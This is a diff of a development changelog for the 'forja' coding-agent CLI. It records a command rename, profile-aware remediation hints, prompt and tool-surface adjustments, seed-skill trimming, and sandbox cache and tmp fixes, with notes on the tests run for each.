+canonical AND under FORJA_PROFILE=dev (seed + CLI both resolve `forja-dev`, fixture
+under that root).
+
+Eighteenth follow-up (README rename residue — same class, operator-flagged). The
+install block symlinked the binary to `~/.local/bin/agent` (pre-rename name) but
+the very next verify commands use `forja --version` / `forja doctor` — a fresh
+install with no existing `forja` on PATH would fail despite a successful build.
+Retargeted the symlink to `~/.local/bin/forja` (the canonical command, matching
+package.json `bin` and every other invocation in the doc) rather than adding a
+dead `agent` alias. Swept the same residue while there: the REPL-launch and
+one-shot examples (`agent` / `agent "…"`), the harness-loop table cell
+(`agent <prompt>` → `forja <prompt>`), and a stale playbook-path cell
+(`agents/*.md` → `.forja/playbooks/*.md`, the real discovery dir). Left the
+generic English prose untouched ("coding agent", "agent CLIs", "the agent
+runtime"). Docs-only.
+
+Nineteenth follow-up (verify remediation commands — same advertised-command
+class, operator-flagged). `forja permission verify` on a BROKEN chain prints two
+copy-paste remediations — `forja permission rotate-chain --reason "…"` and
+`forja --accept-broken-chain …`. Under `forja --profile dev` the chain just
+checked lives in the profiled `forja-dev` namespace, but the bare suggestions
+omitted `--profile`: pasting rotate-chain (MUTATING) or continuing with
+--accept-broken-chain would operate on the CANONICAL install, not the broken
+profiled chain — exactly the bypass `forjaCommand` exists to prevent (its doc
+comment even names verify/rotate-chain). Built both through
+`forjaCommand(rest, options.env)` (threading the test seam; undefined ⇒
+process.env). The SQL-query hints (`SELECT * FROM …`) and the `forja permission
+verify:` error PREFIX are not copy-paste `forja` commands, left as-is. Tests:
+extended the tampered-chain case to assert canonical bare rendering (no-profile
+byte-identical) + a new profiled case (env FORJA_PROFILE=dev; install_id seeded
++ verified under the same profiled env) asserting both commands carry
+`--profile dev` and NOT the bare form. permission-verify suite green (18).
+
+Twentieth follow-up (gc migration hint — the one `forja gc` suggestion the sixth
+follow-up missed, operator-flagged). The sixth follow-up routed gc's main
+dry-run EXECUTE hint and the fresh-install hint through `buildForceCommand`
+(→ forjaCommand), but a THIRD suggestion — the pending-migrations notice on a
+profiled dry-run ("N migration(s) pending; … run `forja gc --force` …") — still
+hardcoded the bare command. gc sweeps the profile's own global DB
+(defaultDbPath is profile-aware) AND --force opens RW + migrates, so a profiled
+operator pasting it would apply migrations / sweep the CANONICAL real DB. Routed
+it through the SAME `buildForceCommand(tables)` already used two lines up (the
+fresh-install hint), so it preserves both the active --profile and the
+operator's `--table` scope. The `forja gc:` stderr PREFIX is a diagnostic label,
+not a copy-paste command — left as-is. Tests: a new pending-migration-hint block
+(empty-schema DB triggers the notice) asserting canonical bare rendering and a
+profiled case (process.env.FORJA_PROFILE=dev) carrying `--profile dev` and not
+the bare form. gc suite green (22).
+
+Twenty-first follow-up (purge no-init-markers hint — the OTHER init suggestion
+the fifth follow-up missed, operator-flagged). The fifth follow-up routed
+purge's dir-doesn't-exist hint through `forjaCommand('init')`, but the SIBLING
+Gate-3 message (dir exists, no init markers) hardcoded BOTH `forja init` AND a
+literal `remove .forja/ manually`. Under `forja --profile dev` the purge gates
+on `.forja-dev/` (projectDirName), so pasting `forja init` would scaffold the
+canonical `.forja/` (leaving the profiled purge still broken) and the manual-
+remove hint would point at the operator's REAL project dir. Routed the command
+through `forjaCommand('init')` and the dir through `projectDirName()` (already
+imported), so both track the active namespace. The `forja purge:` stderr prefix
+stays a diagnostic label. Tests: extended the canonical Gate-3 case to assert
+both render canonical (no-profile byte-identical) + a new profiled case
+(`.forja-dev/` seeded without markers) asserting `forja --profile dev init` and
+`remove .forja-dev/ manually`, and NOT the bare forms. purge suite green (46).
+
+Twenty-second follow-up (curl installer — release-breaking rename residue,
+operator-flagged). `assetName` now produces `forja-<version>-<target>[.exe]` and
+release.yml uploads `dist/forja-*`, but `install.sh` still built
+`asset="agent-${target_id}"` — so ANY release built from this lineage would make
+`curl … | sh` request a non-existent `agent-linux-x64` and fail before checksum
+verification. Two traps beyond the bare rename: (a) the version segment comes
+from the build's version.ts, NOT the git tag (version injection is still a
+future TODO — a `v0.1.0` tag today ships `forja-0.0.0-…`), so reconstructing the
+name from the resolved tag would 404; (b) `asset` was built before the version
+was even resolved. Fixed by DERIVING the asset filename from the published
+SHA256SUMS (downloaded first now): a literal-suffix awk match for the `forja-…`
+entry ending in `-<os>-<arch>[.exe]` — substr compare, not regex, so `.exe`
+isn't read as "any char + exe". The installer never has to know the version
+segment and can't drift from the shipped scheme again; a target absent from
+SHA256SUMS yields a clear "no asset for target" refusal instead of a 404. Also
+fixed the install destination (`$PREFIX/agent` → `$PREFIX/forja`, same class as
+the README symlink — installing under a command the docs don't verify). No
+install.sh test harness exists; verified `sh -n` + exercised the derivation awk
+against a realistic SHA256SUMS fixture (linux-x64 disambiguates from linux-arm64
+and the .exe line; missing target → empty).
+
+## [2026-06-15] Prompt: drop the model id from the # Environment block
+
+The `# Environment` block is a boot snapshot (it sits in cache breakpoint #1,
+not re-probed per turn) and carried a `- model: <id>` line. But `/model` swaps
+the provider mid-session WITHOUT recomposing the system prompt, so that line went
+stale — after a switch the block self-reported the BOOT model while the footer
+(which reads `baseConfig.provider.id` live) showed the new one. Keeping it live
+would mean re-deriving the env section and reconciling all three prompt
+representations (`systemPrompt` string / `systemSegments` cache array /
+`systemPromptHash` audit) on every switch — overkill for a redundant self-report:
+the model already knows its own identity, and the live model is shown in the
+footer. Removed the `model` field from `EnvironmentInput`, the rendered line, the
+bootstrap `modelId: provider.id` arg, and the modelId sanitization rationale. The
+block now carries cwd, os, today, + the git sub-block. `environment-prompt.test`
+updated with a regression guard (`not.toContain('model:')`); typecheck + lint
+clean, env/boot tests green.
+
+## [2026-06-15] TUI: inline arg-hint ghost for slash commands
+
+When the operator finishes typing a slash command (e.g. `/effort`), the accepted
+args now appear dim inline right after it (`/effort [low|medium|high]`) — a
+zsh-style affordance so the options are visible without opening `/help`. Added an
+optional `argHint` to `SlashCommand` (just the args portion, no name/slash) and
+populated the 9 commands that take args: `effort` (dynamic from
+`FORJA_EFFORT_LEVELS`), `model`, `history`, `skill`, `forja`, `perms`, `recap`,
+`budget`, `memory`. The ghost string is computed in `repl.ts` alongside the
+existing popover recompute — only when the typed token is an EXACT command and no
+arg has been typed yet (`parsed.args` empty); the leading space is derived from the
+raw value since the parser trims. It rides the `slash:update` event →
+`state.slash.ghost` → `renderInput`, which paints it `secondary` (SGR 90) after the
+typed text. Gates for autosuggest correctness: cursor at line end (checked in the
+renderer, which sees the live cursor, so it vanishes when the operator arrows off
+the end without a value change), single-line slash only, suppressed under
+dim/bash, and DROPPED rather than wrapped when it would overflow the row. The SGR
+is zero-width and the ghost is not in the buffer, so `composeCursor` (keyed off
+value + cursor) is unaffected — the caret sits just before the ghost. Free-form
+`argHint` (not a structured schema): cheap, and the renderer drops overlong hints,
+so a wide one like `budget` simply doesn't show on narrow terminals. Tests: 7 new
+render cases in `input.test` (trail, secondary paint, trailing-space spacing,
+cursor-mid hidden, dim-suppressed, overflow-dropped, non-slash ignored); `ghost?`
+is optional on the event/state so existing slash/footer/popover tests stay green.
+Spec: refinement over `UI.md §5.3` (popover) — code-first per the UX-iteration
+policy; a spec note can follow. (Verification note: every touched suite passes in
+isolation — input 28/0, slash 645/0, state 183/0 — one combined run surfaced the
+pre-existing `memory.test --trigger` cross-file ordering pollution, unrelated to
+this change.)
+
+## [2026-06-15] Slash: withdraw /pin and the playbook-derived commands
+
+Trimmed the slash surface. `/pin` removed from the builtin registry —
+same withdraw-the-surface pattern as the tool changes: `pinCommand` + its test
+and the `context_pins` store/infra stay intact, only the registry entry goes.
+Consequence to flag: with `pin_context` already pulled from the model earlier
+today, NO surface now creates context pins — the store, the loop's pinnedBlock
+re-injection, and recap's pin-resume are retained but dormant. Fully retiring the
+pins subsystem (migrations, store, loop wiring) is a separate, larger call if the
+operator wants it; left intact for now.
+
+Playbook-derived slash commands (`/review`, `/explore`, `/perf`, `/audit` — one
+per def with a `slash:` field) no longer register: dropped the
+`buildPlaybookSlashCommands` wiring and the now-unused `subagents` param from
+`createBuiltinRegistry`. `buildPlaybookSlashCommands` + its test stay exported
+(not wired), mirroring the keep-the-module pattern. Playbooks remain reachable via
+`task_sync`/`task_async` and the model's playbook hint — which already states
+slash commands are operator-facing and never used for routing, so model behavior
+is unchanged; only the operator's `/review`-style shortcut is gone. Tests:
+`dispatch.test` 19 → 18 builtins (drop `pin`), help row-count 22 → 21, and the two
+playbook-slash-registration tests removed (with the now-unused `SubagentDefinition`
+import); `pin.test` / `playbook.test` untouched. `repl.ts` drops the arg. Spec
+note: `PLAYBOOKS.md §1.4` documents the playbook→slash auto-registration; code now
+diverges (surface withdrawn) — a spec PR can follow if the operator wants the doc
+aligned.
+
+## [2026-06-15] Tools: withdraw pin_context from the model-facing surface
+
+A real session (gpt-5.4-mini) exposed a confusion magnet: asked "quais skills
+tem?", the model called `skill_list`, then `pin_context` — pinning the
+re-injected `[workflow_discipline]`/`[engineering_principles]` guidance block —
+then verbalized accepting the guidance ("Entendido, vou seguir esses critérios")
+and never answered until the operator complained. Root cause: an ad-hoc "pin this
+text" tool, plus the system-prompt "Pin what must persist" nudge, gave a weak
+model a reason to grab the most rule-like text in front of it (the guidance block
+glued to the user message) instead of doing the task.
+
+Removed `pinContextTool` from `BUILTIN_TOOLS`, following the existing
+`wait_for`/`monitor` precedent in the same file: the tool module, its re-exports,
+the `/pin` operator command, the `context_pins` store, recap's pin-resume, and
+`tests/tools/pin-context.test.ts` all stay intact — only the model-facing surface
+is withdrawn. The `# Constraints` "Pin what must persist" bullet (which named
+`pin_context`) is reworded to "Persist what must survive", routing in-session
+durability to the working-state panel / todo list and cross-session to
+`memory_write` — so the prompt no longer nudges a tool the model can't see.
+Updated: `bootstrap.test` exact-list (drop `pin_context`), the constraints-prompt
+regression guard (now asserts the bullet does NOT mention `pin_context` and keeps
+`memory_write`), and `docs/SYSTEM_PROMPT.md` (persistence-nudge description).
+`tui/tool-vocab` and its test keep the `pin_context` verb (operator `/pin` still
+renders). Spec note: `CONTEXT_TUNING §12.4` still documents `pin_context` as a
+model tool — code now diverges (model-surface-withdrawn, capability retained for
+the operator), same shape as the wait_for/monitor divergence; a spec PR can follow
+if the operator wants the doc aligned.
+
+## [2026-06-15] Harness: sharpen the per-step static guidance block
+
+`STATIC_GUIDANCE_BLOCK` (`static-guidance.ts`) is re-injected every step at the
+bottom of `[current_turn]`, just below the `[working_state]` panel — the
+max-attention zone, and unlike the system prompt it is NOT cached, so every
+bullet pays its bytes each turn. Audited it by one test: does this line change a
+decision the model would otherwise get wrong as the turn lengthens and the system
+prompt scrolls out of attention? `[engineering_principles]` failed on two counts —
+"Prefer maintainable and robust implementations" is a non-actionable platitude,
+and "Favor high cohesion and low coupling" is the abstract form of craft rules the
+cached `# Constraints` block already states concretely. Cut both; replaced with
+the two concrete rules that survive the test (match surrounding conventions;
+smallest correct diff). Folded the evidence discipline into the `done` bullet
+(claim done only with evidence, never inference) — the highest-regression behavior
+over a long turn, previously only implied by "satisfactory validation". Added a
+blast-radius bullet to `[workflow_discipline]`: before a wide or hard-to-reverse
+action, verify what else it touches and that a fallback exists — the root premise
+("measure twice, cut once"; every cut has a fallback) made operational per-step,
+and not a dup of the system prompt's `Hard-to-reverse actions` (that gates on
+reversibility; this gates on scope-of-impact). Net 7 → 7 bullets but higher
+density. Also prefixed the block with a one-line frame ("Standing operating
+context — not part of the user's message. Apply it silently: do not acknowledge
+or restate it; answer the user's actual request.") after a real session (the same
+gpt-5.4-mini incident behind the pin_context withdrawal) showed a weak model
+reading the bullets — glued to the bottom of the user turn — as instructions to
+acknowledge and restate rather than background discipline; the frame scopes the
+block as system context and redirects to answering. `static-guidance.test.ts`
+assertions updated (the removed cohesion string → the new blast-radius +
+smallest-diff strings; the startsWith now expects the leading frame). Block
+content is code-led (BACKLOG-documented, not spec-pinned) — no spec PR. Side note
+logged for later: the adjacent `[working_state]` render carries PT-BR strings
+("steps atrás", "últimos … mais novo embaixo") that violate the English-everywhere
+policy.
+
+## [2026-06-15] Skills: trim the seed catalog 20 → 9
+
+Removed 11 seed skills judged too niche or role-specific for a catalog installed
+onto every project: `git-rewrite-history`, the debug/perf family
+(`reproduce-bug`, `debug-failure`, `diagnose-memory-leak`, `profile-hotspot`),
+the forensics/security boundary set (`acquire-forensic-evidence`,
+`investigate-suspicious-host`, `harden-input-boundary`), the two Postgres skills
+(`pg-blocked-sessions`, `pg-heavy-queries`), and `explore-codebase`. The 9 that
+remain stay weighted toward broadly-useful procedures any repo benefits from: git
+recovery / conflict / bisect (`git-recover-lost-work`, `git-resolve-conflict`,
+`git-bisect-regression`), the test family (`add-regression-test`,
+`triage-flaky-test`), the inline self-review pass (`review-diff`), threat modeling
+(`threat-model-component`), and bulk file operations (`bulk-edit-files`,
+`safe-bulk-delete`). The `.md` assets and their `CANONICAL_SKILLS` entries are
+gone; surviving skills' dangling cross-references to the removed ones were
+reworded inline (`add-regression-test`, `review-diff`, `triage-flaky-test` no
+longer point at `debug-failure` / `harden-input-boundary`); the `init-skills`
+count assertions and `docs/SKILLS.md` category summary moved to 9. The seed still
+installs into `project_shared` — install location unchanged. `docs/spec/MEMORY.md`
+keeps an illustrative `skills/pg-heavy-queries.md` example reference; spec is
+read-only and the example is non-normative, so it is left as-is.
+
 ## [2026-06-15] TUI: shorten the banner cwd line
 
 The banner's third line printed `item.cwd` raw. On a removable-drive working
@@ -1081,7 +2385,7 @@ compiled binary (3 parallel subagents, aggregated trails, no task_* chips).
 
 Doc lockstep. The catalog trim (this branch) brought the bundled set to 4
 (CANONICAL_PLAYBOOKS: code-review §2, security-audit §3, perf-investigate §8,
-general-purpose §15), but §12 "Distribuição inicial via agent init" still said
+general-purpose §15), but §12 "Distribuição inicial via forja init" still said
 "os 10 playbooks canônicos listados em §2-§11" in four places — an operator
 reading it would expect the removed tombstone playbooks (§4–§7, §9–§11) to be
 copied, and it contradicted the 4-entry CANONICAL_PLAYBOOKS. Updated the count to
@@ -2761,7 +4065,7 @@ Spec updated: RECAP §1 (`--model` flag), §8.3 (`render_model` in the scope_has
 slash (`--model` parse error / unknown→fallback / known→override / `enabled=false`→deterministic),
 and the cache-key model leg.
 
-A self-review (10 findings, all fixed) hardened it: the real bug was the **headless `agent recap`**
+A self-review (10 findings, all fixed) hardened it: the real bug was the **headless `forja recap`**
 surface rebuilding its `SlashContext` from scratch — it dropped the bootstrap-resolved `recapEnabled`
 / `recapRenderModel` (so `[recap].enabled=false` / `--no-recap` still LLM-rendered in CI) and used an
 empty model registry. Now `run.ts` threads both from `result.config` into `runRecapHeadless`, and the
@@ -2772,11 +4076,11 @@ predicate replaces three scattered `!== false` gates and owns the default-on pol
 `DEFAULT_RECAP_CONFIG` double-default); `renderModel` sentinel unified to `undefined`; subagents pin
 `recapEnabled: false` (non-interactive, can't resume / run /recap); `--no-recap` added to `--help`.
 
-Follow-up: `agent recap pr --no-recap` was still broken — routing into the `recap` subcommand returns
+Follow-up: `forja recap pr --no-recap` was still broken — routing into the `recap` subcommand returns
 before the global `--no-recap` switch, and `parseRecapSubcommand` only consumed `--json`/`--model`,
 so the flag reached the slash parser as an unknown flag (error) instead of setting `args.noRecap`. The
 subcommand parser now consumes `--no-recap` at its boundary (like `--json`/`--model`), so the
-advertised headless deterministic-render switch actually works for `agent recap`.
+advertised headless deterministic-render switch actually works for `forja recap`.
 
 Follow-up 2: the REPL `Alt+R` idle handler still called `buildAutoTerse` unconditionally — the
 session-end and resume paths were gated on `isRecapEnabled` but Alt+R was not, so with recap disabled
@@ -2784,7 +4088,7 @@ an operator could still press Alt+R and get a terse line (§3.3 lists Alt+R as p
 auto-display surface). The handler now checks `isRecapEnabled(baseConfig)` first and warns ("recap
 terse: disabled") so the explicit keypress reports why nothing rendered.
 
-Follow-up 3: headless precedence inversion. `agent recap --model A` with `[recap].render_model = B`
+Follow-up 3: headless precedence inversion. `forja recap --model A` with `[recap].render_model = B`
 rendered with B, not A — `--model` is consumed top-level and folded into the session provider, so
 run.ts then threaded the config render model (B) on top, and the resolver chose B over the session
 provider (A), reversing the documented `--model > config > session` order. Extracted
@@ -3593,13 +4897,13 @@ matches the other `docs/*.md` operator guides; all claims spot-verified against
 
 **Bug (investigação do 2º bloqueador do `smoke-subagent-explore`):** `deriveParentCapabilities` deriva o envelope §10.1 SÓ das `allow rules` das tools (`hasAllowRule`: allow/allow_paths/allow_hosts) e **ignora `defaults.mode`**. Em **bypass mode** (que permite TUDO ao parent, sem allow rules) retorna `[]` → o §10.1 guard (`declared_caps ⊆ parent_caps`) trata qualquer cap declarada por um subagent como `excess` → `subagent_escalation`. Confirmado empírico: bypass → `[]`; child declara `read-fs:.` → excess `["read-fs:."]`. Resultado: em bypass, subagents que declaram caps escalam; só rodam com caps vazias (inúteis p/ fs). Afeta produção (qualquer operador em bypass), não só o smoke.
 
-**Fix:** em `deriveParentCapabilities`, quando `mode === 'bypass'`, tratar todas as tools como allowed → emitir os **footprints universais** (`read-fs:**`, `write-fs:**`, `delete-fs:**`, `exec:arbitrary`, `net-egress:**`, `git-write:**`). Alinha com a spec §10.1 ("subagent herda o effective set do parent"; em bypass = tudo), não a muda. Tool-derived apenas — `secret-access`/`host-passthrough`/`agent-mutate` continuam opt-in (não estão em footprint de tool; exigem profile/sentinel). Seguro: o subagent segue limitado pela tool whitelist + sandbox profile. `strict`/allow-rules **inalterado**.
+**Fix:** em `deriveParentCapabilities`, quando `mode === 'bypass'`, tratar todas as tools como allowed → emitir os **footprints universais** (`read-fs:**`, `write-fs:**`, `delete-fs:**`, `exec:arbitrary`, `net-egress:**`, `git-write:**`). Alinha com a spec §10.1 ("subagent herda o effective set do parent"; em bypass = tudo), não a muda. Tool-derived apenas — `secret-access`/`host-passthrough`/`forja-mutate` continuam opt-in (não estão em footprint de tool; exigem profile/sentinel). Seguro: o subagent segue limitado pela tool whitelist + sandbox profile. `strict`/allow-rules **inalterado**.
 
 **Prova canônica:** `smoke-subagent-explore` agora **PASSA end-to-end** (`IPC progress events: 26`, child lê os arquivos, audit cross-ref íntegro) — estava quebrado desde sempre, mascarado por este bug + o da provider key. Testes: `deriveParentCapabilities(bypass)` → universais; subagent declara `read-fs` sem escalar; `secret-access` ainda escala; non-bypass inalterado.
 
 ## [2026-06-06] `cache clear` apagava o `/tmp` de sessões ativas
 
-**Bug (review):** `agent cache clear --force` removia `~/.cache/forja` INTEIRO, incluindo `tmp/sessions/<id>` — que, com `shared_tmp` (default), são os **bind sources `/tmp` de sessões ATIVAS**. Rodar o clear de outro terminal apagava o source ao vivo; o runner depois passa esse path pro bwrap como `--bind <src> /tmp`, e como source inexistente só é tolerado por `--bind-try` (não `--bind`), toda tool sandboxed da sessão ativa quebrava até reiniciar.
+**Bug (review):** `forja cache clear --force` removia `~/.cache/forja` INTEIRO, incluindo `tmp/sessions/<id>` — que, com `shared_tmp` (default), são os **bind sources `/tmp` de sessões ATIVAS**. Rodar o clear de outro terminal apagava o source ao vivo; o runner depois passa esse path pro bwrap como `--bind <src> /tmp`, e como source inexistente só é tolerado por `--bind-try` (não `--bind`), toda tool sandboxed da sessão ativa quebrava até reiniciar.
 
 **Fix:** o comando opera SÓ no subtree `cache/` (dependency caches) — `dir = join(root, relative(forjaCacheDir(), forjaCachePersistBase()))`, derivado de paths.ts pra não driftar. O sibling `tmp/` nunca é tocado, então um clear num terminal é seguro com outra sessão rodando. Size report + json `dir` agora refletem só o `cache/` subtree. Testes: `--force` remove `cache/` e PRESERVA `tmp/sessions/<id>`; dry-run conta só o `cache/`. Docs: `SECURITY.md §4.9` + `SECURITY_GUIDELINE §8.1`.
 
@@ -3637,9 +4941,9 @@ Novo param `failClosed?` em `MaybeWrapSandboxArgvOptions` (throw no passthrough 
 
 **Code review (5 finders + verificação).** Aplicado: (#1) o `--bind <session> /tmp` agora é gateado a profiles writable (cwd-rw*) como o cache — `ro`/`home-rw` mantêm tmpfs efêmero, fechando uma regressão de isolamento; (#2) o unmask de `XDG_CONFIG_HOME` passou a cobrir os FILES `.config/*` (NuGet/Composer auth) nos dois runners — sob XDG relocado os tokens vazavam pela base `--ro-bind / /`; (#4) quando o `/tmp` bind ocorre, força-se `TMPDIR=/tmp` via passthrough (last-wins sobre o TMPDIR do host da safe-list) — o overlay anterior era inerte pós-`--clearenv`; (#5) `forjaCacheDir` ganhou guard de absoluto p/ `$XDG_CACHE_HOME` relativo (relativo abortaria todo spawn com default-ON). O cluster TMPDIR que 3 finders marcaram como "feature quebrada por default" foi verificado e NÃO era regressão (TMPDIR está na safe-list; caso comum `/tmp`/unset funciona).
 
-**Follow-up: cache agnóstico a linguagem + `agent cache clear`.** O `CACHE_ENV_MAP` virou um modelo de duas camadas: `XDG_CACHE_HOME` como catch-all (cobre pip/uv/Go-build/composer/yarn e qualquer tool XDG-compliant, inclusive desconhecidos) + `CACHE_ENV_MAP` reduzido só aos teimosos não-XDG (npm, GOMODCACHE, NuGet, Maven, Gradle, bun, pnpm) — `buildCacheRedirectEnv` emite `XDG_CACHE_HOME=<base>/xdg` + as vars dos teimosos. Novo `src/cli/cache.ts` + `agent cache clear [--force] [--json]` (dry-run reporta tamanho; `--force` remove) pra recuperar `~/.cache/forja`, que os comandos nativos do operador (rodados fora do sandbox) não alcançam. Testes: cache-env (map só teimosos + XDG catch-all), runner/macos (asserções migradas de GOCACHE→XDG_CACHE_HOME), cli/cache (handler + parser).
+**Follow-up: cache agnóstico a linguagem + `forja cache clear`.** O `CACHE_ENV_MAP` virou um modelo de duas camadas: `XDG_CACHE_HOME` como catch-all (cobre pip/uv/Go-build/composer/yarn e qualquer tool XDG-compliant, inclusive desconhecidos) + `CACHE_ENV_MAP` reduzido só aos teimosos não-XDG (npm, GOMODCACHE, NuGet, Maven, Gradle, bun, pnpm) — `buildCacheRedirectEnv` emite `XDG_CACHE_HOME=<base>/xdg` + as vars dos teimosos. Novo `src/cli/cache.ts` + `forja cache clear [--force] [--json]` (dry-run reporta tamanho; `--force` remove) pra recuperar `~/.cache/forja`, que os comandos nativos do operador (rodados fora do sandbox) não alcançam. Testes: cache-env (map só teimosos + XDG catch-all), runner/macos (asserções migradas de GOCACHE→XDG_CACHE_HOME), cli/cache (handler + parser).
 
-**Deferidos:** (1) Maven < 3.9 ignora `MAVEN_ARGS` → `.m2` segue no tmpfs carve-out como fallback (sem persistência nesse caso); (2) cache cresce até `agent cache clear` (ou o auto-GC dos próprios PMs — Go build trim, Gradle 30d, Composer cache-ttl — que opera no dir redirecionado); um sweep automático no boot/idle é nice-to-have, não bloqueante; (3) `/tmp` persistente NÃO chega aos subagents (o `subagent-child` não adquire tmpdir; só o cache atravessa via override) — herdar o tmpdir do parent fica pra depois; (4) `cache_languages` (subsetar linguagens) adiado; (5) macOS realiza `shared_tmp` pelo mecanismo de tmpdir-subpath já existente (sandbox-exec não tem bind) — assimetria documentada na spec; (6) cargo segue excluído (ver `sandbox-cache-dirs.ts`); (7) `GRADLE_USER_HOME` redireciona `init.d/` junto com o cache → contaminação cross-build intra-sandbox (Gradle não tem env p/ isolar só o dep cache; risco documentado em `sandbox-cache-env.ts`, mantido por decisão do operador).
+**Deferidos:** (1) Maven < 3.9 ignora `MAVEN_ARGS` → `.m2` segue no tmpfs carve-out como fallback (sem persistência nesse caso); (2) cache cresce até `forja cache clear` (ou o auto-GC dos próprios PMs — Go build trim, Gradle 30d, Composer cache-ttl — que opera no dir redirecionado); um sweep automático no boot/idle é nice-to-have, não bloqueante; (3) `/tmp` persistente NÃO chega aos subagents (o `subagent-child` não adquire tmpdir; só o cache atravessa via override) — herdar o tmpdir do parent fica pra depois; (4) `cache_languages` (subsetar linguagens) adiado; (5) macOS realiza `shared_tmp` pelo mecanismo de tmpdir-subpath já existente (sandbox-exec não tem bind) — assimetria documentada na spec; (6) cargo segue excluído (ver `sandbox-cache-dirs.ts`); (7) `GRADLE_USER_HOME` redireciona `init.d/` junto com o cache → contaminação cross-build intra-sandbox (Gradle não tem env p/ isolar só o dep cache; risco documentado em `sandbox-cache-env.ts`, mantido por decisão do operador).
 
 ## [2026-06-06] Fix: bound /compact's summary call with a cancellable + timeout signal
 
@@ -3812,7 +5116,7 @@ The `pin_context` rework (below) added a `validate.ts` gate rejecting `escapesCw
 
 **Fix: clarify modal hotkeys are generated, not the model id.** An option's hotkey was wired straight to its model-supplied `id`, so an id that's a reserved key name (`down`, `up`, `escape`, `enter`, `tab`) collided: `matchesKey` compares `kind:'key'` events by name, and the hotkey check runs before the nav/Esc handlers, so pressing ↓ to move or Esc to skip instead selected the option with that id. Since ids are arbitrary tool input, the manager now generates safe single-char hotkeys (a, b, c, … — `kind:'char'` only, so named keys fall through) by index, carries them on the `clarify:ask` event so the reducer renders the same key that resolves, and keeps the id as the resolved value (`opt:<id>`). Regression test: an id `down` no longer hijacks ↓. tsc + TUI suite (937) + Biome clean. No commit.
 
-**Fix: don't offer operator-confirm tools where no operator is wired (headless).** `buildToolDefs` listed every registry tool to the model, so headless one-shot (`agent run`) — which leaves the confirm hooks unset — advertised `clarify` (and the other `requiresOperatorConfirm` tools), the "Ask, don't presume" constraint nudged toward it, yet calling it only returned `*.modal_unavailable`. Gate the tool list on an operator surface: `buildToolDefs` now omits `requiresOperatorConfirm` tools when `config.confirmPermission` is unset (the REPL wires it unconditionally; `run.ts` never does). The constraint bullet is reworded to be mode-agnostic ("if `clarify` is available, ask; otherwise record the assumption"). General — covers `memory_write` / `pin-context` too, not just clarify. New unit test on `buildToolDefs` (now exported); tsc + harness suite (311) + Biome clean. No commit.
+**Fix: don't offer operator-confirm tools where no operator is wired (headless).** `buildToolDefs` listed every registry tool to the model, so headless one-shot (`forja run`) — which leaves the confirm hooks unset — advertised `clarify` (and the other `requiresOperatorConfirm` tools), the "Ask, don't presume" constraint nudged toward it, yet calling it only returned `*.modal_unavailable`. Gate the tool list on an operator surface: `buildToolDefs` now omits `requiresOperatorConfirm` tools when `config.confirmPermission` is unset (the REPL wires it unconditionally; `run.ts` never does). The constraint bullet is reworded to be mode-agnostic ("if `clarify` is available, ask; otherwise record the assumption"). General — covers `memory_write` / `pin-context` too, not just clarify. New unit test on `buildToolDefs` (now exported); tsc + harness suite (311) + Biome clean. No commit.
 
 ## [2026-06-04] TUI: fix duplicated input rules / footer on terminal resize
 
@@ -3830,7 +5134,7 @@ Verification: TUI renderer/term/compose 124 / 0 fail; `tsc` + Biome clean. Final
 
 **Finding (operator report).** Build toolchains failed inside the sandbox. `cwd-rw` / `cwd-rw-net` start from `--ro-bind / /` and make only the cwd writable, so the whole `$HOME` is read-only — but toolchains write their caches UNDER `$HOME`: go (`~/.cache/go-build` GOCACHE, `~/go/pkg/mod` GOMODCACHE), cargo (`~/.cargo`), npm (`~/.npm`), pip/uv (`~/.cache/*`). A `go build`/`go test` with no secret-access lands in `cwd-rw` (the planner only routes secret-access to `home-rw`), so `$HOME` never becomes writable and the compiler aborts with EROFS. The obvious redirect (`GOCACHE=$PWD/.gocache go test`) is also blocked — the bash resolver refuses `VAR=val cmd` and `env VAR=val cmd` (anti-laundering, `bash.ts:285`/`:2286`), which is correct and stays. So the fix belongs in the sandbox layer.
 
-**Fix — ephemeral tmpfs over the build caches (operator decisions: tmpfs, configurable, code-first).** `src/permissions/sandbox-cache-dirs.ts`: `DEFAULT_WRITABLE_CACHE_DIRS` = `.cache`, `go/pkg/mod`, `.cargo`, `.npm` (Go/Rust/Node/Python), all `$HOME`-relative. The runner (`buildBwrapArgv`, cwd-* profiles only) emits `--tmpfs <home>/<dir>` for each — writable, ephemeral (torn down with the sandbox, no plant survives), and isolating (the empty tmpfs also MASKS the host's real cache, so no read-leak / no write-through). Ordering invariant: the cache mounts are emitted AFTER `--ro-bind / /` but BEFORE the cwd `--bind` and the `HIDE_PATHS_*` overlays, so the cwd bind wins over a cache dir that contains it AND every credential overlay wins over a cache dir (a cache entry can never un-mask a hidden credential — verified: `.cargo` carve-out still leaves `.cargo/credentials.toml` masked). Configurable via `.agent/config.toml [sandbox] writable_cache_dirs` (`loadSandboxConfig`), **sanitized** (`sanitizeWritableCacheDirs` rejects non-string / absolute / `..` entries so a bad value can't `--tmpfs` an arbitrary path) and surfaced as warnings on the run.ts + repl.ts stderr banner. Wired into every spawn site (broker bash, bg bash, grep) through a single module-level override (`setWritableCacheDirsOverride`, the `setRecapCacheTtlOverride` pattern) — no per-call-site threading. Tri-state preserved: absent → DEFAULT, explicit `[]` → carve-out off, list → that list.
+**Fix — ephemeral tmpfs over the build caches (operator decisions: tmpfs, configurable, code-first).** `src/permissions/sandbox-cache-dirs.ts`: `DEFAULT_WRITABLE_CACHE_DIRS` = `.cache`, `go/pkg/mod`, `.cargo`, `.npm` (Go/Rust/Node/Python), all `$HOME`-relative. The runner (`buildBwrapArgv`, cwd-* profiles only) emits `--tmpfs <home>/<dir>` for each — writable, ephemeral (torn down with the sandbox, no plant survives), and isolating (the empty tmpfs also MASKS the host's real cache, so no read-leak / no write-through). Ordering invariant: the cache mounts are emitted AFTER `--ro-bind / /` but BEFORE the cwd `--bind` and the `HIDE_PATHS_*` overlays, so the cwd bind wins over a cache dir that contains it AND every credential overlay wins over a cache dir (a cache entry can never un-mask a hidden credential — verified: `.cargo` carve-out still leaves `.cargo/credentials.toml` masked). Configurable via `.forja/config.toml [sandbox] writable_cache_dirs` (`loadSandboxConfig`), **sanitized** (`sanitizeWritableCacheDirs` rejects non-string / absolute / `..` entries so a bad value can't `--tmpfs` an arbitrary path) and surfaced as warnings on the run.ts + repl.ts stderr banner. Wired into every spawn site (broker bash, bg bash, grep) through a single module-level override (`setWritableCacheDirsOverride`, the `setRecapCacheTtlOverride` pattern) — no per-call-site threading. Tri-state preserved: absent → DEFAULT, explicit `[]` → carve-out off, list → that list.
 
